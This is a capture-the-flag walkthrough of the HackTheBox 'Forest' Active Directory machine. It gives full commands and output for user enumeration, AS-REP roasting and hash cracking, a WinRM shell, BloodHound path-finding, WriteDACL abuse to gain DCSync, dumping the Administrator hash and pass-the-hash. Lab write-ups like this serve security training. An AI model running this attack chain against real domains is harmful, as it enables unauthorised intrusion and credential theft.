
# Forest

## Enumeration

start with a syn-scan nmap scan against the target machine, I'll export the output to a file named allPorts and then i will perform an exhaustive scan against the specific ports

```bash
$ sudo nmap -sS -p- --open --min-rate=5000 -n -Pn 10.10.10.161 -oG allPorts  -vvv
```

i extract the ports from the file and perform a version and script scan against these specific ports

```bash
sudo nmap -sVC -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49684,49706,49980 --min-rate=5000 -n -Pn 10.10.10.161 -oN targeted
```

```java
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-09-15 17:31:49Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49706/tcp open  msrpc        Microsoft Windows RPC
49980/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2024-09-15T17:32:40
|_  start_date: 2024-09-15T17:16:51
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 2h26m41s, deviation: 4h02m31s, median: 6m40s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2024-09-15T10:32:42-07:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.10 seconds
```

there's a htb.local domain so I'll add it to the /etc/hosts

```
echo "10.10.10.161 htb.local" | sudo tee -a /etc/hosts
```

making use of a null session with rpcclient I can enumerate the users of the machine

```bash
$ rpcclient 10.10.10.161 -U "" -N -c "enumdomusers"
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```


## shell as svc-alfresco

with a list of valid users of the target machine which is an active directory an attack that can be performed is an [ASPREPRoast attack](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast), to do this I save the filtered output of the rpcclient command to save only the user string to a dictionary named users.

> ASREPRoast is a security attack that exploits users who lack the **Kerberos pre-authentication required attribute** 
> -hacktricks

```
$ rpcclient 10.10.10.161 -U "" -N -c "enumdomusers" | cut -d ":" -f2|cut -d" " -f1| tr -d "[]"  > users
$ cat users
Administrator
Guest
krbtgt
DefaultAccount
$331000-VK4ADACQNUCA
SM_2c8eef0a09b545acb
SM_ca8c2ed5bdab4dc9b
SM_75a538d3025e4db9a
SM_681f53d4942840e18
SM_1b41c9286325456bb
SM_9b69f1b9d2cc45549
SM_7c96b981967141ebb
SM_c75ee099d0a64c91b
SM_1ffab36a2f5f479cb
HealthMailboxc3d7722
HealthMailboxfc9daad
HealthMailboxc0a90c9
HealthMailbox670628e
HealthMailbox968e74d
HealthMailbox6ded678
HealthMailbox83d6781
HealthMailboxfd87238
HealthMailboxb01ac64
HealthMailbox7108a4e
HealthMailbox0659cc1
sebastien
lucinda
svc-alfresco
andy
mark
santi
```


### aspreproast
running GetNPUsers.py I am able to obtain the TGT of the user svc-alfresco

```bash
$ GetNPUsers.py -no-pass -usersfile users htb.local/
...<snip>...
$krb5asrep$23$svc-alfresco@HTB.LOCAL:4b5ea29c3842acb8465919a662db874f$27c770bf5d0811a77b0525c9d323d98356c526627aa929d89439c119fa8611bf1f6780a27a1a1d4aeadec03bb980a6f91bd3a5d3fde824270400be3a27b8e2c897b957dbf2847e137e4f47fe3288bede141d76eaa60c102671579ebeb7afda66c7114b9c46d6572f58f7029d572e6e3bc66a3fa2e9416ad6b1c7553c57af9715310dd9d57530ee89b2555f8556b657abca479bedcb124aaa5bd980c44f17d98dbe18b0e5bbbca1bdc1852fd60944d114d4a15789ae06ede265600a8091878f0e638301f75f1635262fb416025383411db1ae12e3b9fa318ac6253fe619638266dc7febfb93ad
```

first i identify the hash mode with hashcat

```bash
$ sudo hashcat --identify hash
The following hash-mode match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol
```

then I crack the hash using the kerberos 5 mode
```bash
$ sudo hashcat -a 0 -m 18200 hash /usr/share/wordlists/rockyou.txt
...<snip>...

$krb5asrep$23$svc-alfresco@HTB.LOCAL:4b5ea29c3842acb8465919a662db874f$27c770bf5d0811a77b0525c9d323d98356c526627aa929d89439c119fa8611bf1f6780a27a1a1d4aeadec03bb980a6f91bd3a5d3fde824270400be3a27b8e2c897b957dbf2847e137e4f47fe3288bede141d76eaa60c102671579ebeb7afda66c7114b9c46d6572f58f7029d572e6e3bc66a3fa2e9416ad6b1c7553c57af9715310dd9d57530ee89b2555f8556b657abca479bedcb124aaa5bd980c44f17d98dbe18b0e5bbbca1bdc1852fd60944d114d4a15789ae06ede265600a8091878f0e638301f75f1635262fb416025383411db1ae12e3b9fa318ac6253fe619638266dc7febfb93ad:s3rvice
...<snip>...
```

### access through evil-winrm

with crackmapexec I verify if the credentials are valid for a winrm session and it confirms it is with a pwned message

```bash
$ sudo crackmapexec winrm 10.10.10.161 -u svc-alfresco -p s3rvice
SMB         10.10.10.161    5985   FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)
HTTP        10.10.10.161    5985   FOREST           [*] http://10.10.10.161:5985/wsman
WINRM       10.10.10.161    5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
```


using evil-winrm I am able to obtain a powershell session on the target machine as user svc-alfresco and I am able to read the user flag

```
$ evil-winrm -u svc-alfresco -p s3rvice -i 10.10.10.161
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> type C:\Users\svc-alfresco\Desktop\user.txt
0c2697dca35c...
```


## shell as administrator

given that this is an active directory machine I will make use of bloodhound to find a way to become administrator

I will copy the built-in sharphound.exe from bloodhound to the directory where I started the evil-winrm session

```
$ cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe .
```

I start the neo4j console to make bloodhound functional

```
$ sudo neo4j console
```

then I launch bloodhound and connect to neo4j using my credentials (the default neo4j credentials are neo4j:neo4j). 

on the evil-winrm session I upload SharpHound.exe to the machine

```
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bh> upload SharpHound.exe                                     
Info: Uploading /home/linux/Desktop/forest/content/SharpHound.exe to C:\Users\svc-alfresco\Desktop\bh\SharpHound.exe
```

using sharphound I start the collection method for "All"

```
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bh> .\SharpHound.exe -c All
```

after it finishes collecting the data I download the zipped file to my machine 

```
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bh> download 20240915111107_BloodHound.zip /home/linux/Desktop/forest/content/data.zip
```

and I upload the data to bloodhound 

![](.gitbook/assets/img/htb/forest/upload_data.png)

I select the option of "shortest paths to high value targets" for the domain HTB.LOCAL

![](.gitbook/assets/img/htb/forest/options.png)


### finding paths to domain admin
here I find a graphic representation of a path to become a domain admin from  the user svc-alfresco 

![](.gitbook/assets/img/htb/forest/path1.png)

to find a more descriptive way I filter by the user svc-alfresco in the search bar (to add the skull do right click > mark user as owned)

![](.gitbook/assets/img/htb/forest/search1.png)

to view a new graph I click on the svc-alfresco node and in the node info tab I click on reachable high value targets

![](.gitbook/assets/img/htb/forest/node1.png)

I find that this user is part of an account operators group
![](.gitbook/assets/img/htb/forest/path2.png)

clicking on this node and viewing the high reachable targets I find another interesting path, that this user can perform a "writedacl" on the htb.local domain

![](.gitbook/assets/img/htb/forest/node2.png)

I click on help to view more information about this privilege

![](.gitbook/assets/img/htb/forest/info.png)

> The members of the group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL have permissions to modify the DACL (Discretionary Access Control List) on the domain HTB.LOCAL
> With write access to the target object's DACL, you can grant yourself any privilege you want on the object.

on the windows abuse tab it shows how to perform this dcsync attack step by step 

![](.gitbook/assets/img/htb/forest/info1.png)
### write dacl attack
to perform this attack first I'll create a new user on the domain 

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bh> net user sentreysec password123 /add /domain
The command completed successfully.
```

first if I try secretsdump with the user I created, this gives an access denied error but when the dcsync attack is performed I will be able to see the hashes from another users

```bash
$ impacket-secretsdump htb.local/sentreysec:password123@10.10.10.161
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[-] DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN - The distinguished name specified for this replication operation is invalid.
[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter
[*] Cleaning up... 
```

to do this first I have to add then new user to the group exchange windows permissions 

![](.gitbook/assets/img/htb/forest/path3.png)


```
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bh> net group | findstr "*Exchange Windows Permissions"
*Exchange Servers
*Exchange Trusted Subsystem
*Exchange Windows Permissions
*ExchangeLegacyInterop

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bh> net group "Exchange Windows Permissions" sentreysec /add
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bh> net user sentreysec | findstr "Exchange Windows Permissions"
Global Group memberships     *Exchange Windows Perm*Domain Users
```

I import powerview to the machine

```
$ cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 .

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bh> upload PowerView.ps1 
Info: Uploading /home/linux/Desktop/forest/content/PowerView.ps1 to C:\Users\svc-alfresco\Desktop\bh\PowerView.ps1

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bh> . .\PowerView.ps1
```

Then following the guide that bloodhound shows I'll abuse the write dacl permission

```
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bh> $SecPassword = ConvertTo-SecureString 'password123' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bh> $Cred = New-Object System.Management.Automation.PSCredential('HTB.LOCAL\sentreysec', $SecPassword)

```

the last part gives a bit of a problem to solve it is just define the dc as "DC=htb,DC=local" and the parameter PrincipalIdentity user to define the user that will receive this privilege

```
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bh> Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity sentreysec -Right
s DCSync
```

after doing this now I can retrieve the hashes of other users such as administrator

```
$ impacket-secretsdump htb.local/sentreysec:password123@10.10.10.161
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
```

### pass the hash

with the last part of the hash I can perform a pass the hash attack to get a shell as administrator first I confirm it with crackmapexec

```
$ sudo crackmapexec winrm -i 10.10.10.161 -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6                                 
$ sudo crackmapexec winrm 10.10.10.161 -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6
SMB         10.10.10.161    5985   FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)
HTTP        10.10.10.161    5985   FOREST           [*] http://10.10.10.161:5985/wsman
WINRM       10.10.10.161    5985   FOREST           [+] htb.local\administrator:32693b11e6aa90eb43d32c72a07ceea6 (Pwn3d!)
```

and finally through winrm I get a powershell session as administrator

```
$ evil-winrm -i 10.10.10.161 -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6 
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami 
htb\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
5313a89a86b...
```




